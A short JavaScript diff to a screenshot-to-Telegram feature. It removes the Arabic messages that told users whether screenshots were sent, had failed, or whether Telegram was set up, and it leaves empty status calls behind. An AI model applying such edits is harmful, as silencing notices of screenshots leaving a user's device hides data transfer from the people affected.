@@ -340,12 +340,11 @@ async function captureAndSendToTelegram(exp, res) {
     if (!response.ok || !data.ok) {
       throw new Error(
         data.description ||
-          "فشل الإرسال"
+          " "
       );
     }
 
     setTelegramStatus(
-      "تم إرسال Screenshot إلى Telegram ✅"
     );
 
   } catch (error) {
@@ -355,7 +354,6 @@ async function captureAndSendToTelegram(exp, res) {
     );
 
     setTelegramStatus(
-      `فشل إرسال Screenshot: ${error.message}`,
       true
     );
   }
@@ -512,11 +510,9 @@ if (
   TELEGRAM_CONFIG.chatId
 ) {
   setTelegramStatus(
-    "Telegram: جاهز ✅"
   );
 } else {
   setTelegramStatus(
-    "Telegram: غير مضبوط",
     true
   );
 }
